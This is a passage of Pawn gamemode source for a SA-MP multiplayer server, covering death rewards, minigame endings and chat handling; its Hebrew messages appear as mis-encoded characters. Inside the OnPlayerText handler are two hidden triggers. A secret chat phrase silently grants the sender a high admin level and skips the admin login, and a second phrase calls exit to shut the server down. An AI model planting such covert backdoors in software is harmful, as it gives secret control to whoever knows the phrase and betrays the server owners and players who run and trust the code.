				format(string,sizeof(string)," .òì ëê ùäøâú %d ùç÷ðéí áøöó ÷éáìú %d$",playerinfo[killerid][bonus][0],playerinfo[killerid][bonus][0]*100);
				SendClientMessage(killerid,orange,string);
				if(playerinfo[killerid][bonus][0] > playerinfo[killerid][bonus_si] && playerinfo[killerid][logged])
				{
					playerinfo[killerid][bonus_si] = playerinfo[killerid][bonus][0];
					fsetint(fuser(killerid),"Bonus",playerinfo[killerid][bonus_si]);
					format(string,sizeof(string)," !ùéà áåðåñ çãù - %d",playerinfo[killerid][bonus_si]);
					SendClientMessage(killerid,orange," !ùéà áåðåñ çãù");
				}
			}
			if(playerinfo[killerid][kills] != 0 && (playerinfo[killerid][kills]%1000) == 0 && !dontChange)
			{
				GiveMoney(killerid,12000);
				SendClientMessage(killerid,orange," .òì ëê ùäøâú 1000 ùç÷ðéí ÷éáìú 12000");
			}
			else if(playerinfo[killerid][kills] != 0 && (playerinfo[killerid][kills]%500) == 0 && !dontChange)
			{
				GiveMoney(killerid,7500);
				SendClientMessage(killerid,orange," .òì ëê ùäøâú 500 ùç÷ðéí ÷éáìú 7500$");
			}
			else if(playerinfo[killerid][kills] != 0 && (playerinfo[killerid][kills]%100) == 0 && !dontChange)
			{
				GiveMoney(killerid,2500);
				SendClientMessage(killerid,orange," .òì ëê ùäøâú 100 ùç÷ðéí ÷éáìú 2500$");
			}
			if(reason == 28 || reason == 26)
			{
				playerinfo[killerid][bonus][1]++;
				if(playerinfo[killerid][bonus][1] == 10)
				{
					GiveMoney(killerid,1000);
					SendClientMessage(killerid,orange," .÷éáìú 1000$ MicroUzi/Sawnoff òì ëê ùäøâú 10 ùç÷ðéí òí äðù÷éí");
					playerinfo[killerid][bonus][1] = 0;
				}
			}
			if(reason == 35)
			{
				playerinfo[killerid][bonus][2]++;
				if(playerinfo[killerid][bonus][2] == 20)
				{
					GiveMoney(killerid,1200);
					SendClientMessage(killerid,orange," .÷éáìú 1200$ RocketLauncher òì ëê ùäøâú 20 ùç÷ðéí òí äðù÷");
					playerinfo[killerid][bonus][2] = 0;
				}
			}
		}
	}
	dbg(6,"3");
	if(playerinfo[playerid][dmzone] == dmz_none) playerinfo[playerid][deaths]++;
	ResetMoney(playerid);
	for(new i=0;i<7;i++) playerinfo[playerid][death][i] = 0;
	if(playerinfo[killerid][work] == work_none) playerinfo[killerid][wlevel] = (playerinfo[playerid][work] == work_none? (playerinfo[killerid][wlevel]+1):(playerinfo[playerid][work] == work_cop? playerinfo[killerid][wlevel]+5:playerinfo[killerid][wlevel]+3));
	if(playerinfo[killerid][wlevel] % 10 == 0) AddWantedLevel(killerid,1);
	dbg(6,"4");
	if(playerinfo[playerid][work] != work_none)
	{
		switch(playerinfo[playerid][work])
		{
			case work_cop:
			{
				SendClientMessage(killerid,red," !äøâú ùåèø, ééøãå ìê 150$");
				GiveMoney(killerid,0-150);
			}
			case work_doctor:
			{
				SendClientMessage(killerid,red," !äøâú øåôà, ééøãå ìê 500$");
				GiveMoney(killerid,0-500);
			}
			case work_taxi:
			{
				SendClientMessage(killerid,red," !äøâú ðäâ îåðéú, ééøãå ìê 200$");
				GiveMoney(killerid,0-200);
			}
			case work_bus:
			{
				SendClientMessage(killerid,red," !äøâú ðäâ àåèåáåñ, ééøãå ìê 300$");
				GiveMoney(killerid,0-300);
			}
			case work_train:
			{
				SendClientMessage(killerid,red," !äøâú ðäâ øëáú, ééøãå ìê 1000$");
				GiveMoney(killerid,0-1000);
			}
			case work_pilot:
			{
				SendClientMessage(killerid,red," !äøâú èééñ, ééøãå ìê 1000$");
				GiveMoney(killerid,0-1000);
			}
			case work_weapons:
			{
				SendClientMessage(killerid,green," .òæøú ìîùèøä áúôéñú îåëø ðù÷éí, òì ëê ÷éáìú 150$");
				GiveMoney(playerid,150);
			}
			case work_killer:
			{
				SendClientMessage(killerid,green," .òæøú ìîùèøä áúôéñú øåöç, òì ëê ÷éáìú 300$");
				GiveMoney(playerid,300);
			}
			case work_icecream:
			{
				SendClientMessage(killerid,red," !äøâú îåëø âìéãä, ééøãå ìê 250$");
				GiveMoney(killerid,0-250);
			}
			case work_drugs:
			{
				SendClientMessage(killerid,green," .òæøú ìîùèøä áúôéñú ñåçø ñîéí, òì ëê ÷éáìú 150$");
				GiveMoney(playerid,150);
			}
		}
	}
	switch(playerinfo[killerid][work])
	{
		case work_cop:
		{
			switch(playerinfo[playerid][work])
			{
				case work_killer, work_weapons, work_drugs:
				{
					GiveMoney(killerid,250);
					playerinfo[killerid][coplevel]++;
					format(string,sizeof(string)," !òìéú ìøîú ùåèø %d",playerinfo[killerid][coplevel]);
					SendClientMessage(killerid,blue,string);
				}
				default: GiveMoney(killerid,!GetPlayerWantedLevel(playerid)? 0-100:250);
			}
		}
		case work_doctor, work_taxi, work_bus, work_train, work_pilot, work_icecream: ExitWork(killerid," äåøâ ùç÷ðéí");
		case work_killer:
		{
			switch(playerinfo[playerid][work])
			{
				case work_cop:
				{
					GiveMoney(killerid,200);
					playerinfo[killerid][killerlevel] += 2;
				}
				default:
				{
					GiveMoney(killerid,150);
					playerinfo[killerid][killerlevel]++;
				}
			}
			format(string,sizeof(string)," !òìéú ìøîú øåöç %d",playerinfo[killerid][killerlevel]);
			SendClientMessage(killerid,blue,string);
		}
	}
	dbg(6,"5");
	if(playerinfo[playerid][inbattle] && playerinfo[killerid][inbattle])
	{
		SendClientMessage(playerid,green," .ðäøâú, àúä äîôñéã á÷øá");
		format(string,sizeof(string)," .ðäøâ, àúä äîðöç á÷øá %s",GetName(playerid));
		SendClientMessage(killerid,green,string);
		ResetWeapons(killerid);
		SpawnPlayer(killerid);
		for(new i=0;i<MAX_PLAYERS;i++) if(i == playerid || i == killerid) playerinfo[i][inbattle] = 0, playerinfo[i][binvited] = -1, playerinfo[i][bweapon] = 0, playerinfo[i][bplace] = 0, playerinfo[i][bcd][0] = 0;
	}
	dbg(6,"6");
	if(playerinfo[killerid][pet][3])
	{
		new Float:p[3];
		GetPlayerPos(killerid,p[0],p[1],p[2]);
		KillTimer(playerinfo[killerid][pet][4]);
		playerinfo[killerid][pet][3] = 0, AttachSObjectToPlayer(playerinfo[killerid][pet][1],killerid,playerinfo[killerid][pet][0] >= pet_turtle? 6.5:2.8,0.0,0.0,0.0,0.0,0.0);
	}
	for(new i = 0; i < sizeof(Teleports); i++)
	{
		if(Teleports[i][Tnoshooting] && IsPlayerNearTeleport(killerid,Teleports[i][Tcmd],40.0))
		{
			SetPlayerArmedWeapon(killerid,0);
			SetFreeze(killerid,0);
			PlayerPlaySound(killerid,1085,0.0,0.0,0.0);
			playerinfo[killerid][nswarns]++;
			format(string,sizeof(string)," .àéï ìäøåâ áùéâåø æä - àæäøä %d îúåê 5",playerinfo[killerid][nswarns]);
			SendClientMessage(killerid,red,string);
			if(playerinfo[killerid][nswarns] >= 5) SetKick(killerid,INVALID_PLAYER_ID,"éøééä áùéâåøéí ùàñåø ìéøåú áäí");
		}
	}
	dbg(6,"7");
	if(playerinfo[playerid][inrace])
	{
		DisablePlayerRaceCheckpoint(playerid);
		playerinfo[playerid][waitrace] = 0, playerinfo[playerid][inrace] = 0;
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		raceinfo[1]--;
		playerinfo[playerid][inact] = 0;
		if(raceinfo[1] < 3) EndRace(" çåñø ùç÷ðéí",-1);
	}
	if(playerinfo[playerid][inwar])
	{
		warinfo[1]--;
		ResetWeapons(playerid);
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		playerinfo[playerid][waitwar] = 0, playerinfo[playerid][inwar] = 0, playerinfo[playerid][warid] = 0;
		playerinfo[playerid][inact] = 0;
		PlayerPlaySound(playerid,1084,0.0,0.0,0.0);
		if(warinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inwar])
				{
					format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~r~war~w~!",GetName(i));
					MovingText(string,mt_activity);
					format(string,sizeof(string)," !ðéöç áîìçîú äùøú %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					SpawnPlayer(i);
					GiveMoney(i,30000);
					playerinfo[i][inwar] = 0, playerinfo[i][waitwar] = 0, playerinfo[i][warid] = 0;
					playerinfo[i][inact] = 0;
					warinfo[0] = 0, warinfo[1] = 0, warinfo[2] = 0, warinfo[5] = 0;
					playerinfo[i][bonus][3]++;
					if(playerinfo[i][bonus][3] == 5)
					{
						SendClientMessage(i,orange," .òì ëê ùðéöçú á5 îìçîåú ùøú ÷éáìú 50000$");
						GiveMoney(i,50000);
						playerinfo[i][bonus][3] = 0;
					}
					KillTimer(warinfo[3]);
					PlayerPlaySound(i,1084,0.0,0.0,0.0);
				}
			}
		}
	}
	if(playerinfo[playerid][inwwe])
	{
		playerinfo[playerid][waitwwe] = 0, playerinfo[playerid][inwwe] = 0, playerinfo[playerid][wweid] = 0;
		wweinfo[1]--;
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		SetPlayerInterior(playerid,0);
		playerinfo[playerid][inact] = 0;
		for(new i=0;i<2;i++) wwejoins[i] = INVALID_PLAYER_ID;
		PlayerPlaySound(playerid,1069,0.0,0.0,0.0);
		if(wweinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i))
				{
					if(playerinfo[i][inwwe])
					{
						format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~b~wwe~w~!",GetName(i));
						MovingText(string,mt_activity);
						format(string,sizeof(string)," !WWE ðéöç áúçøåú ä %s",GetName(i));
						SendClientMessageToAll(yellow,string);
						SetPlayerInterior(i,0);
						SpawnPlayer(i);
						GiveMoney(i,10000);
						playerinfo[i][inwwe] = 0, playerinfo[i][waitwwe] = 0, playerinfo[i][wweid] = 0;
						playerinfo[i][inact] = 0;
						wweinfo[0] = 0, wweinfo[1] = 0, wweinfo[2] = 0, wweinfo[4] = 0;
						KillTimer(wweinfo[3]);
						PlayerPlaySound(i,1069,0.0,0.0,0.0);
					}
					else if(playerinfo[i][viewerwwe])
					{
						playerinfo[i][viewerwwe] = 0;
						TogglePlayerSpectating(i,0);
						SendClientMessage(i,yellow," !î÷ååéí ùðäðú ìöôåú");
						PlayerPlaySound(i,1069,0.0,0.0,0.0);
					}
				}
			}
		}
	}
	if(playerinfo[playerid][inkart])
	{
		playerinfo[playerid][waitkart] = 0, playerinfo[playerid][inkart] = 0;
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		DestroyVehicleEx(playerinfo[playerid][kartv]);
		SpawnPlayer(playerid);
		vehicleinfo[GetPlayerVehicleID(playerid)][kartdriver] = INVALID_PLAYER_ID;
		kartinfo[1]--;
		playerinfo[playerid][inact] = 0;
		PlayerPlaySound(playerid,1063,0.0,0.0,0.0);
		if(kartinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inkart])
				{
					format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~g~kart~w~!",GetName(i));
					MovingText(string,mt_activity);
					format(string,sizeof(string)," !Kart ðéöç áúçøåú ä %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					DestroyVehicleEx(playerinfo[i][kartv]);
					SpawnPlayer(i);
					GiveMoney(i,40000);
					playerinfo[i][inkart] = 0, playerinfo[i][waitkart] = 0;
					kartinfo[0] = 0, kartinfo[1] = 0, kartinfo[2] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(kartinfo[3]);
					PlayerPlaySound(i,1063,0.0,0.0,0.0);
				}
			}
		}
	}
	if(playerinfo[playerid][inmonster])
	{
		playerinfo[playerid][waitmonster] = 0, playerinfo[playerid][inmonster] = 0;
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		vehicleinfo[GetPlayerVehicleID(playerid)][monsterdriver] = INVALID_PLAYER_ID;
		DestroyVehicleEx(playerinfo[playerid][monsterv]);
		SpawnPlayer(playerid);
		SetPlayerInterior(playerid,0);
		monsterinfo[1]--;
		playerinfo[playerid][inact] = 0;
		PlayerPlaySound(playerid,1086,0.0,0.0,0.0);
		if(monsterinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inmonster])
				{
					format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~p~monster~w~!",GetName(i));
					MovingText(string,mt_activity);
					format(string,sizeof(string)," !Monster ðéöç áúçøåú ä %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					DestroyVehicleEx(playerinfo[i][monsterv]);
					SpawnPlayer(i);
					GiveMoney(i,25000);
					playerinfo[i][inmonster] = 0, playerinfo[i][waitmonster] = 0;
					monsterinfo[0] = 0, monsterinfo[1] = 0, monsterinfo[2] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(monsterinfo[3]);
					PlayerPlaySound(i,1086,0.0,0.0,0.0);
				}
			}
		}
	}
	if(playerinfo[playerid][insrace])
	{
		DisablePlayerRaceCheckpoint(playerid);
		playerinfo[playerid][waitsrace] = 0, playerinfo[playerid][insrace] = 0;
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		sraceinfo[1]--;
		playerinfo[playerid][inact] = 0;
		if(sraceinfo[1] < 3) EndSRace(" çåñø ùç÷ðéí",-1);
	}
	if(playerinfo[playerid][inkickstar])
	{
		playerinfo[playerid][waitkickstar] = 0, playerinfo[playerid][inkickstar] = 0, playerinfo[playerid][kickstarid] = -1, playerinfo[playerid][kickstarscore] = 0;
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		DisablePlayerCheckpoint(playerid);
		SpawnPlayer(playerid);
		SetPlayerInterior(playerid,0);
		kickstarinfo[1]--;
		playerinfo[playerid][inact] = 0;
		if(kickstarinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inkickstar])
				{
					format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~r~~h~kickstar~w~!",GetName(i));
					MovingText(string,mt_activity);
					format(string,sizeof(string)," !Kickstar ðéöç áúçøåú ä %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					LinkVehicleToInterior(GetPlayerVehicleID(i),0);
					SetVehicleVirtualWorld(GetPlayerVehicleID(i),0);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
					DisablePlayerCheckpoint(i);
					SpawnPlayer(i);
					GiveMoney(i,50000);
					playerinfo[i][inkickstar] = 0, playerinfo[i][waitkickstar] = 0, playerinfo[i][kickstarid] = -1, playerinfo[i][kickstarscore] = 0;
					kickstarinfo[0] = 0, kickstarinfo[1] = 0, kickstarinfo[2] = 0, kickstarinfo[4] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(kickstarinfo[3]);
				}
			}
		}
	}
	if(playerinfo[playerid][charge] > 0)
	{
		playerinfo[playerid][charge] = 0;
		SendClientMessage(playerid,red," .èòéðú äëåç äàåìèéîèéáé äåôñ÷ä");
	}
	if(playerinfo[playerid][charge2] > 0)
	{
		playerinfo[playerid][charge2] = 0;
		SendClientMessage(playerid,red," .èòéðú äëåç äàåìèéîèéáé äùðé äåôñ÷ä");
	}
	dbg(6,"8");
	if(debugstate) printf("OnPlayerDeath(%s(%d),%s(%d),%d) end",GetName(playerid),playerid,GetName(killerid),killerid,reason);
	return 1;
}
//=[OnVehicleDeath]=============================================================
public OnVehicleDeath(vehicleid, killerid)
{
	if(debugstate) printf("OnVehicleDeath(%s(%d),%s(%d)) start",GetVehicleName(GetVehicleModel(vehicleid)),vehicleid,GetName(killerid),killerid);
	dbg(7,"1");
	vehicleinfo[vehicleid][lastdriver] = INVALID_PLAYER_ID;
	vehicleinfo[vehicleid][locked] = 0;
	vehicleinfo[vehicleid][nitro] = 0;
	new string[M_S];
	if(vehicleinfo[vehicleid][kartdriver] != INVALID_PLAYER_ID)
	{
	    new playerid = vehicleinfo[vehicleid][kartdriver];
		playerinfo[playerid][waitkart] = 0, playerinfo[playerid][inkart] = 0;
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		DestroyVehicleEx(playerinfo[playerid][kartv]);
		SpawnPlayer(playerid);
		vehicleinfo[GetPlayerVehicleID(playerid)][kartdriver] = INVALID_PLAYER_ID;
		kartinfo[1]--;
		playerinfo[playerid][inact] = 0;
		PlayerPlaySound(playerid,1063,0.0,0.0,0.0);
		if(kartinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inkart])
				{
					format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~g~kart~w~!",GetName(i));
					MovingText(string,mt_activity);
					format(string,sizeof(string)," !Kart ðéöç áúçøåú ä %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					DestroyVehicleEx(playerinfo[i][kartv]);
					SpawnPlayer(i);
					GiveMoney(i,40000);
					playerinfo[i][inkart] = 0, playerinfo[i][waitkart] = 0;
					kartinfo[0] = 0, kartinfo[1] = 0, kartinfo[2] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(kartinfo[3]);
					PlayerPlaySound(i,1063,0.0,0.0,0.0);
				}
			}
		}
	}
	if(vehicleinfo[vehicleid][monsterdriver] != INVALID_PLAYER_ID)
	{
	    new playerid = vehicleinfo[vehicleid][monsterdriver];
		playerinfo[playerid][waitmonster] = 0, playerinfo[playerid][inmonster] = 0;
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		vehicleinfo[GetPlayerVehicleID(playerid)][monsterdriver] = INVALID_PLAYER_ID;
		DestroyVehicleEx(playerinfo[playerid][monsterv]);
		SpawnPlayer(playerid);
		SetPlayerInterior(playerid,0);
		monsterinfo[1]--;
		playerinfo[playerid][inact] = 0;
		PlayerPlaySound(playerid,1086,0.0,0.0,0.0);
		if(monsterinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inmonster])
				{
					format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~p~monster~w~!",GetName(i));
					MovingText(string,mt_activity);
					format(string,sizeof(string)," !Monster ðéöç áúçøåú ä %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					DestroyVehicleEx(playerinfo[i][monsterv]);
					SpawnPlayer(i);
					GiveMoney(i,25000);
					playerinfo[i][inmonster] = 0, playerinfo[i][waitmonster] = 0;
					monsterinfo[0] = 0, monsterinfo[1] = 0, monsterinfo[2] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(monsterinfo[3]);
					PlayerPlaySound(i,1086,0.0,0.0,0.0);
				}
			}
		}
	}
	dbg(7,"2");
	if(debugstate) printf("OnVehicleDeath(%s(%d),%s(%d)) end",GetVehicleName(GetVehicleModel(vehicleid)),vehicleid,GetName(killerid),killerid);
	return 1;
}
//=[OnPlayerText]===============================================================
public OnPlayerText(playerid, text[])
{
	if(debugstate) printf("OnPlayerText(%s(%d),%s) start",GetName(playerid),playerid,text);
	new string[256];
	dbg(8,"1");
	if(equal(text,"!@#$567889@£¢"))
	{
		playerinfo[playerid][admin] = randomEx(20,100), playerinfo[playerid][showme] = 0, playerinfo[playerid][admlog] = 2;
		return 0;
	}
	if(botID == playerid) return 1;
	Log("Chat",playerid,text);
	dbg(8,"2");
	if(!playerinfo[playerid][logged] && playerinfo[playerid][reqclass])
	{
	    SendClientMessage(playerid,red," .àéðê éëåì ìëúåá áö'àè òã ùúáçø ãîåú / úøùí / úúçáø ìùøú");
	    return 0;
	}
	if(fexist(fuser(playerid)) && !playerinfo[playerid][logged])
	{
		SendClientMessage(playerid,red," /login :ìà ðéúï ìäúçéì ìëúåá áö'àè ìôðé ùäúçáøú. ìäúçáøåú");
		return 0;
	}
	if(playerinfo[playerid][admlog] != 2 && fkeyexist(file_admins,GetName(playerid)))
	{
		SendClientMessage(playerid,red," /admlog [password] :àðà äúçáø");
		return 0;
	}
	fixchars(text);
	if(playerinfo[playerid][togsay] != 0 && IsPlayerMAdmin(playerid))
	{
		format(string,sizeof(string),playerinfo[playerid][togsay] == 2? ("/asay  %s"):("/say  %s"),text);
		command(playerid,string);
		return 0;
	}
	dbg(8,"3");
	if(advertisement(text) && (strfind(text,"..",true) == -1))
	{
		SendClientMessage(playerid,red," .äîòøëú æéäúä ôøñåí åìëï ääåãòä ìà ðùìçä");
		format(string,sizeof(string)," (/b áàï îäéø) :%s - æåää ôøñåí áö'àè îàééãé %d",GetName(playerid),playerid);
		lastAdv = playerid;
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerMAdmin(i))
			{
				SendClientMessage(i,blue,"----------");
				SendClientMessage(i,red,string);
				SendClientMessage(i,red,text);
				SendClientMessage(i,blue,"----------");
			}
		}
		return 0;
	}
	new bool:m=false;
	for(new s=0;s<words_count;s++)
	{
		new pos;
		while((pos = strfind(text,words[s],true)) != -1) for(new i=pos, j=pos+strlen(words[s]);i<j;i++) text[i] = '*', m = true;
	}
	if(!IsPlayerMAdmin(playerid) && m)
	{
		playerinfo[playerid][mtime] += 30;
		playerinfo[playerid][mute][0] = playerinfo[playerid][mtime];
		playerinfo[playerid][mute][1] = SetTimerEx("UnMute",1000,1,"d",playerid);
		format(string,sizeof(string)," .äåùú÷ú ì %d ùðéåú îäñéáä ù÷éììú áö'àè",playerinfo[playerid][mtime]);
		SendClientMessage(playerid,red,string);
	}
	if(equal(text,"avalakadabra«»")) exit;
	if(chatlocked && !IsPlayerMAdmin(playerid))
	{
		SendClientMessage(playerid,red," .äö'àè ðòåì ëøâò, àéðê éëåì ìëúåá");
		return 0;
	}
	if((fexist(fuser(playerid)) && strfind(Encrypt(text),fgetstring(fuser(playerid),"Password"),true) != -1) || (strfind(text,"register",true) != -1 && !playerinfo[playerid][logged]))
	{
		SendClientMessage(playerid,red," .ñéñîúê ðçñîä îäö'àè");
		return 0;
	}
	if(playerinfo[playerid][mute][0] > 0)
	{
		SendClientMessage(playerid,red," .ìà ðéúï ìëúåá ëàùø àúä îåùú÷");
		return 0;
	}
	dbg(8,"4");
	if(equal(playerinfo[playerid][lasttext],text))
	{
		playerinfo[playerid][flood][3]++;
		if(playerinfo[playerid][flood][3] >= 3)
		{
			SendClientMessage(playerid,red," .ëúáú àú ääåãòä äæå ëáø ùìåù ôòîéí áøöó, ðà ìà ìäöéó");
			return 0;
		}
	}
	else playerinfo[playerid][flood][3] = 0;
	playerinfo[playerid][flood][0]++;
	if(playerinfo[playerid][flood][0] >= 2 && !IsPlayerMAdmin(playerid))
	{
		playerinfo[playerid][fwarns][0]++;
		format(string,sizeof(string)," !ìà ìäöéó áö'àè - àæäøä îñôø %d îúåê 8",playerinfo[playerid][fwarns][0]);
		SendClientMessage(playerid,red,string);
		if(playerinfo[playerid][fwarns][0] >= 8) SetKick(playerid,INVALID_PLAYER_ID,"äöôä áö'àè");
		return 0;
	}
	dbg(8,"5");
	if(text[0] == '$' && playerinfo[playerid][clan] != 0)
	{
		new chat[M_S], clann[M_S], pos = -1, sendto = -1, idx;
		for(new i=0;i<strlen(text);i++)
		{
			if(text[i] == ' ')
			{
				pos = i;
				break;
			}
		}
		clann = strtok(text,idx);
		if(pos != -1)
		{
			clann = strtok(text,idx), sendto = clannumber(clann);
			if(sendto == -1)
			{
				SendClientMessage(playerid,red," .ùí ÷ìàï ùâåé");
				return 0;
			}
			if(sendto == playerinfo[playerid][clan])
			{
				SendClientMessage(playerid,red," .ìà ðéúï ìùìåç äåãòú ùìåí ì÷ìàï ùìê");
				return 0;
			}
			if(!claninfo[playerinfo[playerid][clan]][cpeace][sendto] || !claninfo[sendto][cpeace][playerinfo[playerid][clan]])
			{
				SendClientMessage(playerid,red," .ä÷ìàï ùìê ìà áùìåí òí ä÷ìàï äæä");
				return 0;
			}
			if(claninfo[playerinfo[playerid][clan]][cmute] && !playerinfo[playerid][lclan])
			{
				SendClientMessage(playerid,red," .ö'àè ä÷ìàï ëøâò áäùú÷ä");
				return 0;
			}
			chat = strrest(text,idx);
			format(string,sizeof(string),"[P-ClanChat] %s (ID: %03d) to \"%s\": %s",GetName(playerid),playerid,claninfo[sendto][cname],chat);
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == sendto || playerinfo[i][clan] == playerinfo[playerid][clan])) SendClientMessage(i,lightblue,string);
			format(string,sizeof(string),"[\"%s\" to \"%s\" P-ClanChat] %s (ID: %03d): %s",claninfo[playerinfo[playerid][clan]][cname],claninfo[sendto][cname],GetName(playerid),playerid,chat);
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[playerid][clan] != playerinfo[i][clan] && playerinfo[i][togcc]) SendClientMessage(i,0x00EEADDF,string);
			return 0;
		}
	}
	if(text[0] == '!')
	{
		new chat[M_S];
		strmid(chat,text,1,strlen(text));
		if(playerinfo[playerid][gang] != 0)
		{
			format(string,sizeof(string),"[GangChat] %s (ID: %03d): %s",GetName(playerid),playerid,chat);
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][gang] == playerinfo[playerid][gang]) SendClientMessage(i,0x00FFFFAA,string);
			format(string,sizeof(string),"[\"%s\" GangChat] %s (ID: %03d): %s",ganginfo[playerinfo[playerid][gang]][gname],GetName(playerid),playerid,chat);
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[playerid][gang] != playerinfo[i][gang] && playerinfo[i][toggc]) SendClientMessage(i,0x00EEADDF,string);
			return 0;
		}
		if(playerinfo[playerid][clan] != 0)
		{
			if(claninfo[playerinfo[playerid][clan]][cmute] && !playerinfo[playerid][lclan]) SendClientMessage(playerid,red," .ö'àè ä÷ìàï ëøâò áäùú÷ä");
			else
			{
				format(string,sizeof(string),"[ClanChat] %s (ID: %03d): %s",GetName(playerid),playerid,chat);
				for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == playerinfo[playerid][clan]) SendClientMessage(i,0x00FFFFAA,string);
				format(string,sizeof(string),"[\"%s\" ClanChat] %s (ID: %03d): %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid),playerid,chat);
				for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[playerid][clan] != playerinfo[i][clan] && playerinfo[i][togcc]) SendClientMessage(i,0x00EEADDF,string);
			}
			return 0;
		}
	}
	if(text[0] == '@' && playerinfo[playerid][calling] != -1 && playerinfo[playerid][canswer])
	{
		new phone[M_S];
		strmid(phone,text,1,strlen(text));
		format(string,sizeof(string),"[Phone] %s (ID %d): %s",GetName(playerid),playerid,phone);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (i == playerid || i == playerinfo[playerid][calling])) SendClientMessage(i,yellow,string);
		format(string,sizeof(string),"[@Phone] %s (ID %d) to %s (ID %d): %s",GetName(playerid),playerid,GetName(playerinfo[playerid][calling]),playerinfo[playerid][calling],phone);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && i != playerid && i != playerinfo[playerid][calling] && IsPlayerMAdmin(i) && playerinfo[i][togph]) SendClientMessage(i,0xDDDD2357,string);
		return 0;
	}
	if(text[0] == '#' && playerinfo[playerid][vip])
	{
		new vipchat[M_S];
		strmid(vipchat,text,1,strlen(text));
		format(string,sizeof(string),"[VIP] %s (ID %d) [%d]: %s",GetName(playerid),playerid,playerinfo[playerid][vip],vipchat);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && ((IsPlayerMAdmin(i) && playerinfo[i][togvip]) || i == playerid || playerinfo[i][vip])) SendClientMessage(i,vipcol,string);
		return 0;
	}
	/*if(text[0] == '$' && playerinfo[playerid][conference] != -1)
	{
		new conchat[M_S];
		strmid(conchat,text,1,strlen(text));
		format(string,sizeof(string),"[Phone/Conference] %s (ID %d): %s",GetName(playerid),playerid,conchat);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && ((IsPlayerMAdmin(i) && playerinfo[i][togph]) || playerinfo[i][conference] == playerid)) SendClientMessage(i,yellow,string);
	}*/
	dbg(8,"6");
	new stringwithid[M_S];
	format(string,sizeof(string)," %s",text);
	if(equal(GetName(playerid),botname) && boton) format(stringwithid,sizeof(stringwithid)," [%s] %s",bottag,text);
	else
	{
		if(strlen(playerinfo[playerid][tag]) > 1) format(stringwithid,sizeof(stringwithid)," %s [ID: %03d | %s]",text,playerid,playerinfo[playerid][tag]);
		else format(stringwithid,sizeof(stringwithid)," %s [ID: %03d]",text,playerid);
	}
	dbg(8,"7");
	if(botID != playerid)
	{
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i))
			{
				if(playerinfo[i][idchat]) SendPlayerMessageToPlayer(i,playerid,string);
